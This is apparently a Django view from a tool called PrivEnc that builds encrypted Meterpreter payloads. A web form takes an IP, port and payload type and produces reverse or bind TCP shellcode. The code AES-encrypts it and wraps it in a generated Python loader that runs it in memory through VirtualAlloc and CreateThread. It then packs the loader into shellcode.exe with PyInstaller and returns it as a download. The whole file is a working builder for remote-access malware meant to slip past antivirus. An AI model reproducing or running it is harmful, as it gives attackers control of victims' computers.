"""
Buse SAVCI - 2020
"""
import os
from django.http import HttpResponse
from django.shortcuts import render
from .forms import EncryptForm
from .models import Data
from PrivEnc import meterpereter_generator as mg, encryptor

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


def index(request):
    global shellCode
    IP_value = request.POST.get('IP_value')
    Port_value = request.POST.get('Port_value')
    Sleep_value = request.POST.get('Sleep_value')
    Payload_value = request.POST.get('Payload_value')
    Application_value = request.POST.get('Application_value')
    Encryption_value = request.POST.get('Encryption_value')

    data = Data(IP_value=IP_value, Port_value=Port_value, Sleep_value=Sleep_value, Payload_value=Payload_value,
                Application_value=Application_value, Encryption_value=Encryption_value)

    if request.method == 'POST':
        form = EncryptForm(request.POST)
        if form.is_valid():
            # ---- generate shellcode for selected payload ----- #
            if Payload_value == 'meterpreter/reverse_tcp':
                shellCode = mg.x86ShellCode.ReverseTcp(IP_value, Port_value)
            elif Payload_value == 'meterpreter/x64/reverse_tcp':
                shellCode = mg.x64ShellCode.ReverseTcp(IP_value, Port_value)
            elif Payload_value == 'meterpreter/bind_tcp':
                shellCode = mg.x86ShellCode.BindTcp(Port_value)
            elif Payload_value == 'meterpreter/x64/bind_tcp':
                shellCode = mg.x64ShellCode.BindTcp(Port_value)
            print(repr(shellCode))
            # ----------------- encryption -------------------- #
            # encrypted_shellcode = ec.RSA_Encrypt.Encrypt(shellCode)
            pwd = os.urandom(16)
            encrypted = encryptor.AESCipher.AesEncrypt(shellCode, pwd)


            # workspace
            os.chdir(BASE_DIR)

            # -------create python file with encrypted shellcode-------- #
            # get python file from https://github.com/talha/shellcode-exec/blob/master/python/shellcode-retriever.py

            # ________________________________________ python code ____________________________________________#
            p_file = 'from ctypes import *\n' \
                     'import sys\n' \
                     'from hashlib import md5\n' \
                     'from base64 import b64decode\n' \
                     'from base64 import b64encode\n\n' \
                     'from Crypto.Cipher import AES\n' \
                     'from Crypto.Random import get_random_bytes\n' \
                     'from Crypto.Util.Padding import pad, unpad\n\n' \
                     'class AESCipher:\n' \
                     '    def __init__(self, key):\n' \
                     '        self.key = md5(key).digest()\n\n' \
                     '    def encrypt(self, data):\n' \
                     '        iv = get_random_bytes(AES.block_size)\n' \
                     '        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)\n' \
                     '        return b64encode(iv + self.cipher.encrypt(pad(data, AES.block_size)))\n\n' \
                     '    def decrypt(self, data):\n' \
                     '        raw = b64decode(data)\n' \
                     '        self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])\n' \
                     '        return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)\n\n\n' \
                     'kernel32 = windll.kernel32\n\n' \
                     '# constants\n' \
                     'NULL = None\n' \
                     'PAGE_EXECUTE_READWRITE = 0x40\n' \
                     'MEM_RESERVE = 0x00002000\n' \
                     'MEM_COMMIT = 0x00001000\n\n' \
                     'def shellcode_retreiver(shellcode):\n' \
                     '    handle = kernel32.VirtualAlloc(NULL, len(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE)\n' \
                     '    buffer = (c_char * (len(shellcode))).from_buffer(shellcode)\n' \
                     '    kernel32.RtlMoveMemory(handle, buffer, len(shellcode))\n' \
                     '    h_thread = kernel32.CreateThread(0, 0, handle, 0, 0, pointer(c_int(0)))\n' \
                     '    kernel32.WaitForSingleObject(h_thread, 0xFFFFFFFF)\n\n' \
                     'def main():\n' \
                     '    encrypted = ' + str(encrypted) + '\n' \
                     '    pwd = ' + str(pwd) + '\n\n' \
                     '    message = AESCipher(pwd).decrypt(encrypted)\n' \
                     '    print(" Message : "+ repr(message))\n' \
                     '    shellcode_retreiver(bytearray(message))\n\n\n' \
                     'if __name__ == "__main__":\n' \
                     '    main()\n'
            # ________________________________________ python code ____________________________________________#

            f = open("shellcode.py", "w+")
            f.write(p_file)
            f.close()
            #
            # # ----------------- generate .exe ----------------- #
            os.system("C:\\Python27\\Scripts\\pyinstaller.exe --onefile " + BASE_DIR + "\\shellcode.py")
            os.chdir(BASE_DIR + "\\dist")  # workspace
            exefile = open("shellcode.exe", "rb")
            #
            # # ---------------- send to client ------------------ #
            response = HttpResponse(exefile, content_type='application/octet-stream', )
            response['Content-Disposition'] = 'attachment; filename="shellcode.exe"'
            #
            return response
    else:
        form = EncryptForm()

    return render(request, 'PrivEnc/index.html', {'form': form, 'data': data})
